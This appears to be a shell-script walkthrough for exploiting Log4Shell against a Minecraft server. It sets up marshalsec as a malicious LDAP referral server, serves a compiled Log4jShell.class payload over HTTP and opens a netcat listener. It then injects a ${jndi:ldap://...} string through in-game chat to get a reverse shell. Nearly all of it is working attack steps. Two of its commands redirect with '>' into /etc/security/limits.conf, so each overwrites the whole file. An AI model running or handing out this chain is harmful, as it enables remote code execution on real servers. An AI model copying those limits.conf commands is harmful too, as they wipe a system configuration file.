#The simplest way to solve this is by crafting a bit of malicious code 
#This can be done by setting up a netcat listener, a web server to serve the code 
#and the exploit via a weaponized ldap server.
#I personally used a Kali vm to host these servers and serve the malicious code.
#To compile the exploit follow the instructions here https://github.com/Justin-Garey/Minecraft-Log4j-Exploit?tab=readme-ov-file 

#download jdk-8u181-linux-x64.tar.gz file from https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html 
#And place into the folder you will run the poc from
sudo tar -zxvf jdk-8u181-linux-x64.tar.gz -C /usr/lib/jvm

#Set it as an option to select in java and javac
sudo update-alternatives --install /usr/bin/java java /usr/lib/jvm/jdk1.8.0_181/bin/java 1
sudo update-alternatives --install /usr/bin/javac javac /usr/lib/jvm/jdk1.8.0_181/bin/javac 1

#set the java version to 8u181
sudo update-alternatives --config java
sudo update-alternatives --config javac

#install marshalsec and maven
git clone https://github.com/mbechler/marshalsec.git
sudo apt update
sudo apt install maven
cd marshalsec
ulimit -n 4096

#Increase System-Wide Limits: by editing /etc/security/limits.conf file, ensure your VM has 4096mb of memory allocted
sudo echo "* soft nofile 4096" > /etc/security/limits.conf 
sudo echo "* hard nofile 4096" > /etc/security/limits.conf 
#start maven
mvn clean package -DskipTests 
#start the ldap listener with the ip of your attacker box
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://0.0.0.0:8888/#Log4jShell"

#in a new terminal open a netcat listener 
sudo nc -lvnp 9001 

#Update Log4jShell.java with your nc listener IP and port then compile the exploit 
javac Log4jShell.java 
#in a new terminal open a web server where Log4jShell.class is stored
sudo python3 -m http.server 8888 

#Send this command in chat in the minecraft server, change the IP to the one for your attacker box
${jndi:ldap://0.0.0.0:1389/#Log4jShell}

#this will connect to the ldap server 
#Then return the payload "Log4jShell.class" from the directory the web server is running in
#if the payload is correct it will connect to your nc listener and give you a shell